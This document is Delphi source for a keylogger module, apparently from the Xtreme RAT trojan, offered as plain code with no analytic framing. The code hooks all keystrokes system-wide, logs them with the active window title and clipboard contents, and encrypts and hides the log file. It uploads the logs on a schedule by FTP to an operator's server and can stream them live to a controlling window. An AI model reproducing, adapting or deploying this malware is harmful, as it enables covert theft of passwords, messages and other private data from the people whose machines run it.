unit UnitKeylogger;

interface

uses
  windows,UnitGetAccType,
  StrUtils,
  UnitCryptString,
  UnitConfigs,
  Functions;

procedure StartKey;
procedure StopKey;
function FTPUploadFile(remote_server, //by Rot1
                       directory,
                       local_file,
                       remote_file,
                       user,
                       pass: PWideChar): boolean;

var
  KeyloggerConfig: TConfiguracoes;
  KeyloggerFileName: pWideChar;

  KeyObject: Cardinal = 0;
  ServerWindow: cardinal = 0;
  WM_GETKEY, WM_DEACTIVEKEY, WM_ACTIVEKEY, WM_CHECKKEY, WM_CLEARKEY, WM_ONLINEKEY: Cardinal;
  OnlineKeylogger: boolean = false;
  ServerFirstRun: boolean = False;

implementation

type
  PKeyboardState = ^TKeyboardState;
  TKeyboardState = array[0..255] of Byte;

type
  TDeadKey = record
    wVirtKey, wScanCode: UINT;
    keystate: TKeyboardState;
end;

type
  KeybdLLHookStruct = record
    vkCode      : cardinal;
    scanCode    : cardinal;
    flags       : cardinal;
    time        : cardinal;
    dwExtraInfo : cardinal;
  end;

type
  TKeyInfo = record
    vkCode,
    scanCode: dWord;
    KeyboardState: TKeyboardState;
    MyHKL: HKL;
end;

const
  WH_KEYBD_LL = 13;
  WM_SYSKEYDOWN = $0104;
  WM_KEYDOWN = $0100;
  WM_DRAWCLIPBOARD = $0308;

function GetKeyboardState(var KeyState: TKeyboardState): BOOL; stdcall; external user32 name 'GetKeyboardState';
function ToUnicodeEx(wVirtKey, wScanCode: UINT; lpKeyState: TKeyboardState;
  pwszBuff: PWideChar; cchBuff: Integer; wFlags: UINT; dwhkl: HKL): Integer; stdcall; external user32 name 'ToUnicodeEx';

var
  kHook: Cardinal = 0;
  KeyloggerFile: Cardinal;
  LastDeadKey: TDeadKey;
  EmBranco, PrimeiraVez: boolean;
  LastCaption: WideString;
  LastLogPosition: int64 = 0;
  FTPThread: THandle;

function WriteFile(hFile: THandle; Const Buffer; nNumberOfBytesToWrite: DWORD;
  var lpNumberOfBytesWritten: DWORD; lpOverlapped: POverlapped): BOOL;
begin
  EnDecryptKeylogger(@Buffer, nNumberOfBytesToWrite div 2);
  Result := Windows.WriteFile(hFile, Buffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
  EnDecryptKeylogger(@Buffer, nNumberOfBytesToWrite div 2);
end;

function UpperString(S: WideString): WideString;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := widechar(CharUpperW(PWideChar(S[i])));
  Result := S;
end;

function LowerString(S: WideString): WideString;
var
  i: Integer;
begin
  for i := 1 to Length(S) do
    S[i] := widechar(CharLowerW(PWideChar(S[i])));
  Result := S;
end;

function PossoGravar(Janela: WideString): boolean;
var
  i, Size: integer;
  Permitidos, TempStr, TempJanela: WideString;
begin
  Result := True;
  Permitidos := KeyloggerConfig.RecordWords;
  if Permitidos = '' then Exit;
  result := False;
  TempJanela := Janela;

  while (Permitidos <> '') do
  begin
    if posex(';', Permitidos) > 0 then
    begin
      TempStr := Copy(Permitidos, 1, posex(';', Permitidos) - 1);
      Delete(Permitidos, 1, posex(';', Permitidos));
    end else TempStr := Permitidos;

    Result := posex(UpperString(TempStr), UpperString(TempJanela)) > 0;
    if Result = True then Break;
  end;
end;

function GetLastSentSize: integer;
var
  hOpenKey: HKEY;
  iI, iSize, iType: Integer;
  TempStr: WideString;
begin
  Result := 0;
  TempStr := 'SOFTWARE\' + WideString(KeyloggerConfig.Mutex) + #0;

  if RegOpenKeyExW(HKEY_CURRENT_USER, pWideChar(TempStr), 0, KEY_READ, hOpenKey) = ERROR_SUCCESS then
  begin
    iType := REG_DWORD;       // Type of data that is going to be read
    iSize := SizeOf(Integer); // Buffer for the value to read
    if RegQueryValueExW(hOpenKey, 'LastSize', nil, @iType, @iI, @iSize) = ERROR_SUCCESS then result := iI;
    RegCloseKey(hOpenKey);
  end;
end;

procedure SetLastSentSize(Last: integer);
var
  hOpenKey: HKEY;
  iI, iSize, iType: Integer;
  pdI: PDWORD;
  TempStr: WideString;
begin
  pdI := nil;
  TempStr := 'SOFTWARE\' + WideString(KeyloggerConfig.Mutex) + #0;

  if RegCreateKeyExW(HKEY_CURRENT_USER, pWideChar(TempStr), 0, nil,
    REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, hOpenKey, pdI) = ERROR_SUCCESS then
  begin
    iType := REG_DWORD;       // Type of data that is going to be read
    iSize := SizeOf(Integer); // Buffer for the value to read
    iI := Last;
    RegSetValueExW(hOpenKey, 'LastSize', 0, iType, @iI, iSize);
    RegCloseKey(hOpenKey); // Close the open registry key
  end;
end;

function CheckLowerCase: boolean;
begin
  result := true;
  if (GetKeyState(VK_CAPITAL) = 1) and (GetKeyState(VK_SHIFT) < 0) then result := true else
  if (GetKeyState(VK_CAPITAL) = 1) and (GetKeyState(VK_SHIFT) >= 0) then result := false else
  if (GetKeyState(VK_CAPITAL) <> 1) and (GetKeyState(VK_SHIFT) < 0) then result := false else
  if (GetKeyState(VK_CAPITAL) <> 1) and (GetKeyState(VK_SHIFT) >= 0) then result := true;
end;

function GetCharFromVKey(wVirtKey, wScanCode: word; keystate: TKeyboardState; MyHKL: HKL): WideString;
var
  retcode: Integer;
  buf: widechar;
  DeadKey: TDeadKey;
  buff: array [0..127] of widechar;
  ks: TKeyboardState;
  TempBool, DelBack: boolean;
begin
  Result := '';
  DelBack := False;
  ZeroMemory(@Buff, SizeOf(Buff));
  
    case wVirtKey of
{
      $C1: Result := '[Abnt C1]';
      $C2: Result := '[Abnt C2]';
      VK_ATTN: Result := '[Attn]';
      VK_CANCEL: Result := '[Break]';
      VK_CLEAR: Result := '[Clear]';
      VK_CRSEL: Result := '[Cr Sel]';
      VK_EREOF: Result := '[Er Eof]';
      VK_EXSEL: Result := '[Ex Sel]';
      $E6: Result := '[IcoClr]';
      $E3: Result := '[IcoHlp]';
      VK_NONAME: Result := '[NoName]';
      $F0: Result := '[Oem Attn]';
      $F3: Result := '[Auto]';
      $E1: Result := '[Ax]';
      VK_OEM_CLEAR: Result := '[OemClr]';
      $EF: Result := '[Cu Sel]';
      $F4: Result := '[Enlw]';
      $95: Result := '[Loya]';
      $93: Result := '[Mashu]';
      $96: Result := '[Roya]';
      $94: Result := '[Touroku]';
      $EA: Result := '[Jump]';
      $EB: Result := '[OemPa1]';
      $EC: Result := '[OemPa2]';
      $ED: Result := '[OemPa3]';
      $EE: Result := '[WsCtrl]';
      VK_PA1: Result := '[Pa1]';
      $E7: Result := '[Packet]';
      $FF: Result := '[no VK mapping]';
      $A6: Result := '[Browser Back]';
      $AB: Result := '[Browser Favorites]';
      $A7: Result := '[Browser Forward]';
      $AC: Result := '[Browser Home]';
      $A8: Result := '[Browser Refresh]';
      $AA: Result := '[Browser Search]';
      $A9: Result := '[Browser Stop]';
      VK_CONVERT: Result := '[Convert]';
      VK_LBUTTON: Result := '[Left Button **]';
      VK_FINAL: Result := '[Final]';
      $E4: Result := '[Ico00 *]';
      VK_JUNJA: Result := '[Junja]';
      VK_KANA: Result := '[Kana]';
      VK_KANJI: Result := '[Kanji]';
      $B6: Result := '[App1]';
      $B7: Result := '[App2]';
      VK_LSHIFT: Result := '[Left Shift]';
      VK_LWIN: Result := '[Left Win]';
      VK_MBUTTON: Result := '[Middle Button **]';
      VK_NONCONVERT: Result := '[Non Convert]';
      $92: Result := '[Jisho]';
      VK_RBUTTON: Result := '[Right Button **]';
      VK_RSHIFT: Result := '[Right Shift]';
      VK_RWIN: Result := '[Right Win]';
      $05: Result := '[X Button 1 **]';
      $06: Result := '[X Button 2 **]';
}

      VK_ADD: Result := '[Numpad +]';
      VK_BACK: Result := '[Backspace]';
      VK_DECIMAL: Result := '[Numpad .]';
      VK_DIVIDE: Result := '[Numpad /]';
      VK_ESCAPE: Result := '[Esc]';
      VK_EXECUTE: Result := '[Execute]';
      VK_MULTIPLY: Result := '[Numpad *]';
      VK_NUMPAD0: Result := {'[Numpad 0]'} '0';
      VK_NUMPAD1: Result := {'[Numpad 1]'} '1';
      VK_NUMPAD2: Result := {'[Numpad 2]'} '2';
      VK_NUMPAD3: Result := {'[Numpad 3]'} '3';
      VK_NUMPAD4: Result := {'[Numpad 4]'} '4';
      VK_NUMPAD5: Result := {'[Numpad 5]'} '5';
      VK_NUMPAD6: Result := {'[Numpad 6]'} '6';
      VK_NUMPAD7: Result := {'[Numpad 7]'} '7';
      VK_NUMPAD8: Result := {'[Numpad 8]'} '8';
      VK_NUMPAD9: Result := {'[Numpad 9]'} '9';
      $F5: Result := '[Back Tab]';
      $F2: Result := '[Copy]';
      $F1: Result := '[Finish]';
      $E9: Result := '[Reset]';
      VK_PLAY: Result := '[Play]';
      VK_PROCESSKEY: Result := '[Process]';
      VK_RETURN: Result := #13#10; //'[Enter]';
      VK_SELECT: Result := '[Select]';
      VK_SEPARATOR: Result := '[Separator]';
      VK_SPACE: Result := ' '; //'[Space]';
      VK_SUBTRACT: Result := '[Numpad -]';
      VK_TAB: Result := '[Tab]';
      VK_ZOOM: Result := '[Zoom]';
      VK_ACCEPT: Result := '[Accept]';
      VK_APPS: Result := '[Context Menu]';
      VK_CAPITAL: Result := '[Caps Lock]';
      VK_DELETE: Result := '[Delete]';
      VK_DOWN: Result := '[Arrow Down]';
      VK_END: Result := '[End]';
      VK_F1: Result := '[F1]';
      VK_F10: Result := '[F10]';
      VK_F11: Result := '[F11]';
      VK_F12: Result := '[F12]';
      VK_F13: Result := '[F13]';
      VK_F14: Result := '[F14]';
      VK_F15: Result := '[F15]';
      VK_F16: Result := '[F16]';
      VK_F17: Result := '[F17]';
      VK_F18: Result := '[F18]';
      VK_F19: Result := '[F19]';
      VK_F2: Result := '[F2]';
      VK_F20: Result := '[F20]';
      VK_F21: Result := '[F21]';
      VK_F22: Result := '[F22]';
      VK_F23: Result := '[F23]';
      VK_F24: Result := '[F24]';
      VK_F3: Result := '[F3]';
      VK_F4: Result := '[F4]';
      VK_F5: Result := '[F5]';
      VK_F6: Result := '[F6]';
      VK_F7: Result := '[F7]';
      VK_F8: Result := '[F8]';
      VK_F9: Result := '[F9]';
      VK_HELP: Result := '[Help]';
      VK_HOME: Result := '[Home]';
      VK_INSERT: Result := '[Insert]';
      $B4: Result := '[Mail]';
      $B5: Result := '[Media]';
      VK_LCONTROL: Result := '[Left Ctrl]';
      VK_LEFT: Result := '[Arrow Left]';
      VK_LMENU: Result := '[Left Alt]';
      $B0: Result := '[Next Track]';
      $B3: Result := '[Play / Pause]';
      $B1: Result := '[Previous Track]';
      $B2: Result := '[Stop]';
      VK_MODECHANGE: Result := '[Mode Change]';
      VK_NEXT: Result := '[Page Down]';
      VK_NUMLOCK: Result := '[Num Lock]';
      VK_PAUSE: Result := '[Pause]';
      VK_PRINT: Result := '[Print]';
      VK_PRIOR: Result := '[Page Up]';
      VK_RCONTROL: Result := '[Right Ctrl]';
      VK_RIGHT: Result := '[Arrow Right]';
      VK_RMENU: Result := '[Right Alt]';
      VK_SCROLL: Result := '[Scrol Lock]';
      $5F: Result := '[Sleep]';
      VK_SNAPSHOT: Result := '[Print Screen]';
      VK_UP: Result := '[Arrow Up]';
      $AE: Result := '[Volume Down]';
      $AD: Result := '[Volume Mute]';
      $AF: Result := '[Volume Up]';
    end;

  if (Length(result) > 0) and
     (KeyloggerConfig.KeyDelBackspace = True) and  // não aceita caracters especiais
     (posex('[', Result) > 0) and    // aceita #13#10, ' ', e outros se existirem
     (posex('Numpad', Result) <= 0)  // aceita numpad no resultado
     then
  begin
    DelBack := True;
    Result := 'KeyDelBackspace';
  end;
  TempBool := CheckLowerCase;

  retcode := ToUnicodeEx(wVirtKey, wScanCode, keystate, buff, sizeof(buff), 0, MyHKL);
  if retcode > 0 then
  begin
    DeadKey := LastDeadKey;

    if Length(result) = 0 then
    begin
      Result := Buff;
      if TempBool = False then Result := UpperString(Result) else Result := LowerString(Result);
    end;

    if (DeadKey.wVirtKey <> 0) then
    begin
      ToUnicodeEx(DeadKey.wVirtKey, DeadKey.wScanCode, DeadKey.keystate, buff, sizeof(buff), 0, MyHKL);
    end;
    ZeroMemory(@LastDeadKey, sizeof(LastDeadKey));
  end else if retcode < 0 then
  begin
    LastDeadKey.wVirtKey := wVirtKey;
    LastDeadKey.wScanCode := wScanCode;
    LastDeadKey.keystate := keystate;
    ZeroMemory(@ks, sizeof(ks));

    MapVirtualKeyW(VK_DECIMAL, 1);
    while (retcode < 0) do
    begin
      retcode := ToUnicodeEx(VK_DECIMAL, MapVirtualKeyW(VK_DECIMAL, 1), ks, buff, sizeof(buff), 0, MyHKL);
    end;
  end;

  if DelBack = True then Result := '';
end;

function LowLevelKeybdHookProc(nCode, wParam, lParam : integer) : integer; stdcall;
type
  PKBDLLHOOKSTRUCT = ^KBDLLHOOKSTRUCT;
  KBDLLHOOKSTRUCT = record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: Longword;
  end;
var
  info : KBDLLHOOKSTRUCT;
  idControlActive: integer;
  hwndActiveWin: HWND;
  KeyInfo: TKeyInfo;
  p: Pointer;
begin
  try
    info := PKBDLLHOOKSTRUCT(lParam)^;
    if ((nCode = HC_ACTION) and ((wParam = WM_SYSKEYDOWN) or (wParam = WM_KEYDOWN))) then
    begin
      ZeroMemory(@KeyInfo, SizeOf(KeyInfo));

      GetKeyboardState(KeyInfo.KeyboardState);
      hwndActiveWin := GetForegroundWindow;
      idControlActive := GetWindowThreadProcessId(hwndActiveWin, nil);
      KeyInfo.MyHKL := GetKeyboardLayout(idControlActive);
      KeyInfo.vkCode := info.vkCode;
      KeyInfo.scanCode := info.scanCode;

      p := VirtualAlloc(nil, SizeOf(KeyInfo), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      CopyMemory(p, @KeyInfo, SizeOf(KeyInfo));

      {Post}SendMessage(KeyObject, WM_GETKEY, SizeOf(KeyInfo), integer(p));
    end;
    finally
    result := CallNextHookEx(kHook, nCode, wParam, lParam);
  end;
end;

procedure StopKey;
begin
  if KeyObject > 0 then SendMessage(KeyObject, WM_DEACTIVEKEY, 0, 0);
  if KeyloggerFile <> 0 then CloseHandle(KeyloggerFile);
  KeyloggerFile := 0;
  KeyObject := 0;
end;

procedure ShowTime(Buffer: pWideChar);
var
  tm: TSYSTEMTIME;
begin
  GetLocalTime(tm);
  GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_SHORTDATE, @tm, nil, Buffer, 255);
  Buffer[StrLen(Buffer)] := WideChar($20);
  GetTimeFormatW(LOCALE_SYSTEM_DEFAULT, TIME_FORCE24HOURFORMAT, @tm, nil, @Buffer[StrLen(Buffer)], 255);
end;

function ActiveCaption: WideString;
var
  Handle: THandle;
  Title: array [0..5000] of WideChar;
  i: integer;
begin
  Result := '';
  Handle := GetForegroundWindow;
  if Handle <> 0 then
  begin
    i := GetWindowTextW(Handle, Title, SizeOf(Title));
    Result := WideString(Title);
  end;
end;

function KeyWindowProc(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  KeyInfo: TKeyInfo;
  s: integer;
  c: cardinal;
  buf: widechar;
  TempBool: boolean;
  ClipResult: pWideChar;
  Janela, Resultado: WideString;
  Hora, ClipHora: array [0..MAX_PATH] of WideChar;
  JanelasDiferente: boolean;
  Size: int64;
  p: pointer;
  TempStr: WideString;
begin
  Result := DefWindowProc(HWND, Msg, wParam, lParam);

  if Msg = WM_ACTIVEKEY then
  begin
    if kHook <> 0 then UnhookWindowsHookEx(kHook);
    if Is64BitOS then kHook := SetWindowsHookExW(wh_keybd_ll, @LowLevelKeybdHookProc, 0, 0)
    else
    kHook := SetWindowsHookExW(wh_keybd_ll, @LowLevelKeybdHookProc, GetModuleHandle(0), 0);
  end else

  if Msg = WM_GETKEY then
  begin
    ZeroMemory(@Hora, SizeOf(Hora));
    Janela := '';
    Resultado := '';

    s := integer(wParam);
    CopyMemory(@KeyInfo, pointer(lparam), S);
    VirtualFree(pointer(lparam), 0, MEM_RELEASE);

    janela := ActiveCaption;
    JanelasDiferente := LastCaption <> Janela;
    if JanelasDiferente = True then LastCaption := Janela;

    if PossoGravar(Janela) = False then Exit;

    Resultado := GetCharFromVKey(KeyInfo.vkCode, KeyInfo.scanCode, KeyInfo.KeyboardState, KeyInfo.MyHKL);

    if KeyloggerFile <> INVALID_HANDLE_VALUE then
    begin
      if JanelasDiferente = True then
      begin
        if EmBranco = False then
        begin
          TempStr := #13#10#13#10;
          WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

          if (ServerWindow <> 0) and (OnlineKeylogger = True) then
          begin
            p := VirtualAlloc(nil, Length(TempStr) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            CopyMemory(p, @TempStr[1], Length(TempStr) * 2);
            PostMessage(ServerWindow, WM_ONLINEKEY, Length(TempStr) * 2, integer(p));
          end;

        end;
        WriteFile(KeyloggerFile, Janela[1], Length(Janela) * 2, c, nil);

        if (ServerWindow <> 0) and (OnlineKeylogger = True) then
        begin
          p := VirtualAlloc(nil, Length(Janela) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          CopyMemory(p, @Janela[1], Length(Janela) * 2);
          PostMessage(ServerWindow, WM_ONLINEKEY, Length(Janela) * 2, integer(p));
        end;

        TempStr := ' --- ';
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

        if (ServerWindow <> 0) and (OnlineKeylogger = True) then
        begin
          p := VirtualAlloc(nil, Length(TempStr) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          CopyMemory(p, @TempStr[1], Length(TempStr) * 2);
          PostMessage(ServerWindow, WM_ONLINEKEY, Length(TempStr) * 2, integer(p));
        end;

        ShowTime(Hora);
        WriteFile(KeyloggerFile, Hora, StrLen(Hora) * 2, c, nil);

        if (ServerWindow <> 0) and (OnlineKeylogger = True) then
        begin
          p := VirtualAlloc(nil, StrLen(Hora) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          CopyMemory(p, @Hora, StrLen(Hora) * 2);
          PostMessage(ServerWindow, WM_ONLINEKEY, StrLen(Hora) * 2, integer(p));
        end;

        TempStr := #13#10;
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

        if (ServerWindow <> 0) and (OnlineKeylogger = True) then
        begin
          p := VirtualAlloc(nil, Length(TempStr) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          CopyMemory(p, @TempStr[1], Length(TempStr) * 2);
          PostMessage(ServerWindow, WM_ONLINEKEY, Length(TempStr) * 2, integer(p));
        end;

        EmBranco := False;
        PrimeiraVez := False;
      end;

      if PrimeiraVez = True then
      begin
        TempStr := #13#10;
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

        TempStr := ' --- ';
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

        ShowTime(Hora);
        WriteFile(KeyloggerFile, Hora, StrLen(Hora) * 2, c, nil);

        TempStr := #13#10;
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);
      end;

      WriteFile(KeyloggerFile, Resultado[1], Length(Resultado) * 2, c, nil);

      if (ServerWindow <> 0) and (OnlineKeylogger = True) then
      begin
        p := VirtualAlloc(nil, Length(Resultado) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        CopyMemory(p, @Resultado[1], Length(Resultado) * 2);
        PostMessage(ServerWindow, WM_ONLINEKEY, Length(Resultado) * 2, integer(p));
      end;

      PrimeiraVez := False;
      EmBranco := False;
    end;
  end else

  if Msg = WM_DRAWCLIPBOARD then
  begin
    if kHook = 0 then exit;
    if ServerFirstRun = True then
    begin
      ServerFirstRun := False;
      Exit;
    end;

    ClipResult := '';
    ZeroMemory(@ClipHora, SizeOf(ClipHora));

    if GetClipboardText(0, ClipResult, Size) = True then
    begin
      if Size > 0 then
      begin
        if EmBranco = False then
        begin
          TempStr := #13#10;
          WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);
          WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);
        end;

        TempStr := '[CLIPBOARD] ---- ';
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);
        ShowTime(ClipHora);
        WriteFile(KeyloggerFile, ClipHora, StrLen(ClipHora) * 2, c, nil);

        TempStr := #13#10;
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);
        WriteFile(KeyloggerFile, ClipResult[0], Size, c, nil);
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

        TempStr := '[CLIPBOARD END]';
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

        TempStr := #13#10;
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);
        WriteFile(KeyloggerFile, TempStr[1], Length(TempStr) * 2, c, nil);

        EmBranco := False;
      end;
    end;
  end else

  if Msg = WM_DEACTIVEKEY then
  begin
    if kHook <> 0 then UnhookWindowsHookEx(kHook);
    kHook := 0;
  end else

  if Msg = WM_CHECKKEY then
  begin
    if kHook <> 0 then Result := WM_CHECKKEY + 1 else Result := 0;
  end else

  if Msg = WM_CLEARKEY then
  begin
    if KeyloggerFile = 0 then exit;
    SetFilePointer(KeyloggerFile, 0, nil, FILE_BEGIN);
    SetEndOfFile(KeyloggerFile);
    LastLogPosition := 0;
    if KeyloggerConfig.SendFTPLogs = True then SetLastSentSize(LastLogPosition);
  end else

end;

function CreateWindowExW(dwExStyle: DWORD; lpClassName: PWideChar;
  lpWindowName: PWideChar; dwStyle: DWORD; X, Y, nWidth, nHeight: Integer;
  hWndParent: HWND; hMenu: HMENU; hInstance: HINST; lpParam: Pointer): HWND;
  stdcall; external user32 name 'CreateWindowExW';

function TMyObjectCreate(NewClassName: pWideChar; FuncPointer: Pointer = nil): Cardinal;
  function WindowProc(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
  begin
    Result := DefWindowProc(HWND, Msg, wParam, lParam);
  end;
var
  Msg: TMsg;
  Rect: TRect;
  WNDClass: TWndClassW;
  hInst: cardinal;
begin
  with WNDClass do
  begin
    style := 0;
    if FuncPointer = nil then lpfnWndProc := @WindowProc else lpfnWndProc := FuncPointer;
    cbClsExtra := 0;
    cbWndExtra := 0;
    hInstance := 0;
    hIcon := 0;
    hCursor := 0;
    hbrBackground := 0;
    lpszMenuName := nil;
    lpszClassName := NewClassName;
  end;

  GetWindowRect(GetDesktopWindow, Rect);
  hInst := GetModuleHandle(nil);
  RegisterClassW(WNDClass);
  Result := CreateWindowExW(WS_EX_TOOLWINDOW,
                            WNDClass.lpszClassName,
                            '',
                            WS_VISIBLE or WS_DISABLED or WS_POPUP,
                            Rect.Right,
                            Rect.Bottom,
                            0,
                            0,
                            0,
                            0,
                            hInst,
                            nil);
end;

function EnviarLogs(remote_server,
                    directory,
                    local_file,
                    remote_file,
                    user,
                    pass: pWideChar): boolean;
var
  Str: pWideChar;
  i: int64;
  newFile: THandle;
  c: cardinal;
  SendSize: int64;
  Header: array [0..1] of byte;
begin
  Result := False;

  if KeyloggerFile <> INVALID_HANDLE_VALUE then
  begin
    SendSize := 0;
    i := GetFileSize(KeyloggerFile, nil);
    if i > 0 then SendSize := i;
    if SendSize <= 0 then Exit;
    LastLogPosition := GetLastSentSize;

    if LastLogPosition > SendSize then
    begin
      LastLogPosition := 0;
      SetLastSentSize(0);
    end else if LastLogPosition = SendSize then exit; // já foi enviado e não houve alteração

    if KeyObject = 0 then Exit;
    SendMessage(KeyObject, WM_DEACTIVEKEY, 0, 0);

    SetFilePointer(KeyloggerFile, LastLogPosition, nil, FILE_BEGIN);
    Str := VirtualAlloc(nil, SendSize - LastLogPosition, MEM_COMMIT, PAGE_READWRITE);
    ReadFile(KeyloggerFile, Str[0], SendSize - LastLogPosition, c, nil);

    SetFilePointer(KeyloggerFile, 0, nil, FILE_END);

    SendMessage(KeyObject, WM_ACTIVEKEY, 0, 0);
  end else Exit;

  SetFileAttributesW(local_file, FILE_ATTRIBUTE_NORMAL);
  DeleteFileW(local_file);

  newFile := CreateFileW(local_file, GENERIC_WRITE, 0, nil, CREATE_ALWAYS, 0, 0);
  if newFile <> INVALID_HANDLE_VALUE then
  begin
    header[0] := $FF;
    header[1] := $FE;
    windows.WriteFile(newFile, Header, SizeOf(Header), c, nil);
    WriteFile(newFile, Str[0], SendSize - LastLogPosition, c, nil);
    VirtualFree(@Str, 0, MEM_RELEASE);
  end;
  CloseHandle(newFile);

  Result := FTPUploadFile(remote_server,
                          directory,
                          local_file,
                          remote_file,
                          user,
                          pass);
  if Result = True then
  begin
    LastLogPosition := SendSize;
    SetLastSentSize(SendSize);
  end;

  DeleteFileW(local_file);
end;

function FTPprocedure(p: pointer): DWORD; stdcall;
var
  i: integer;
  Hora: array [0..255] of WideChar;
begin
  Result := 0;

  while true do
  begin
    i := 0;

    repeat
      sleep(1000);
      inc(i);
    until i >= ((KeyloggerConfig.FTPFreq + 1) * 5) * 60;

    if KeyloggerFile = 0 then continue;

    ZeroMemory(@Hora, SizeOf(Hora));
    ShowTime(Hora);

    for i := 0 to StrLen(Hora) - 1 do
    if Hora[i] = ':' then Hora[i] := '.' else
    if Hora[i] = '/' then Hora[i] := '.' else
    if Hora[i] = ' ' then Hora[i] := '-';

    if EnviarLogs(KeyloggerConfig.FTPAddress,
                  KeyloggerConfig.FTPFolder,
                  SomarPWideChar(KeyloggerFileName, 'FTP'),
                  Hora,
                  KeyloggerConfig.FTPUser,
                  KeyloggerConfig.FTPPass) then
    if (KeyloggerConfig.FTPDelLogs = True) and (KeyloggerConfig.SendFTPLogs = True) then
    begin
      SetFilePointer(KeyloggerFile, 0, nil, FILE_BEGIN);
      SetEndOfFile(KeyloggerFile);
      LastLogPosition := 0;
      SetLastSentSize(0);
    end;
  end;
end;

procedure StartKey;
var
  s: pWideChar;
  Header: array [0..1] of byte;
  c: cardinal;
  Size: int64;
  i: integer;
begin
  StopKey;
  PrimeiraVez := True;
  s := 'XtremeKeylogger';

  if KeyObject <= 0 then KeyObject := TMyObjectCreate(s, @KeyWindowProc);
  ShowWindow(KeyObject, SW_HIDE);

  SetFileAttributesW(KeyloggerFileName, FILE_ATTRIBUTE_NORMAL);
  KeyloggerFile := CreateFileW(KeyloggerFileName,
                               GENERIC_READ + GENERIC_WRITE,
                               FILE_SHARE_READ + FILE_SHARE_WRITE,
                               nil,
                               OPEN_ALWAYS,
                               0,
                               0);
  if KeyloggerFile = INVALID_HANDLE_VALUE then Exit;

  Size := GetFileSize(KeyloggerFile, 0);
  if Size = 0 then
  begin
    header[0] := $FF;
    header[1] := $FE;
    WriteFile(KeyloggerFile, Header, SizeOf(Header), c, nil);
    EmBranco := True;
  end else EmBranco := False;

  SetFileAttributesW(KeyloggerFileName, FILE_ATTRIBUTE_READONLY + FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM);
  SetFilePointer(KeyloggerFile, 0, nil, FILE_END);

  i := GetLastSentSize;

  if i > Size then
  begin
    LastLogPosition := 0;
    SetLastSentSize(0);
  end else LastLogPosition := i;

  SendMessage(KeyObject, WM_ACTIVEKEY, 0, 0);
  SetClipboardViewer(KeyObject);

  if KeyloggerConfig.SendFTPLogs = true then
  begin
    if FTPThread <> 0 then CloseThread(FTPThread);
    FTPThread := StartThread(@FTPprocedure, nil);
  end;
end;

function InternetConnectW(hInet: Pointer; lpszServerName: PWideChar;
  nServerPort: Word; lpszUsername: PWideChar; lpszPassword: PWideChar;
  dwService: DWORD; dwFlags: DWORD; dwContext: DWORD): Pointer; stdcall; external 'wininet.dll' name 'InternetConnectW';
function InternetOpenW(lpszAgent: PWideChar; dwAccessType: DWORD;
  lpszProxy, lpszProxyBypass: PWideChar; dwFlags: DWORD): Pointer; stdcall; external 'wininet.dll' name 'InternetOpenW';
function FtpSetCurrentDirectoryW(hConnect: Pointer; lpszDirectory: PWideChar): BOOL; stdcall; external 'wininet.dll' name 'FtpSetCurrentDirectoryW';
function FtpPutFileW(hConnect: Pointer; lpszLocalFile: PWideChar;
  lpszNewRemoteFile: PWideChar; dwFlags: DWORD; dwContext: DWORD): BOOL; stdcall; external 'wininet.dll' name 'FtpPutFileW';
function InternetCloseHandle(hInet: Pointer): BOOL; stdcall; external 'wininet.dll' name 'InternetCloseHandle';

function FTPUploadFile(remote_server, //by Rot1
                       directory,
                       local_file,
                       remote_file,
                       user,
                       pass: PWideChar): boolean;
var
  hInet, hConnect: Pointer;
  Dir, Put: Boolean;
begin
  hInet := InternetOpenW(nil, 1, nil, nil, 0);
  hConnect := InternetConnectW(hInet,
                               remote_server,
                               21,
                               user,
                               pass,
                               1,
                               $08000000,
                               0);
  Dir := ftpSetCurrentDirectoryW(hConnect, directory);
  WaitForSingleObject(Cardinal(Dir), infinite);
  Put := ftpPutFileW(hConnect, local_file, remote_file, $00000002, 0);
  InternetCloseHandle(hInet);
  InternetCloseHandle(hConnect);
  Result:= Put;
end;

initialization
  WM_GETKEY := RegisterWindowMessageW('jiejwogfdjieovevodnvfnievn');
  WM_DEACTIVEKEY := RegisterWindowMessageW('trhgtehgfsgrfgtrwegtre');
  WM_ACTIVEKEY := RegisterWindowMessageW('jytjyegrsfvfbgfsdf');
  WM_CHECKKEY := RegisterWindowMessageW('hgtrfsgfrsgfgregtregtr');
  WM_CLEARKEY := RegisterWindowMessageW('frgjbfdkbnfsdjbvofsjfrfre');
  WM_ONLINEKEY := RegisterWindowMessageW('frgkmjgtmklgtlrglt');
end.
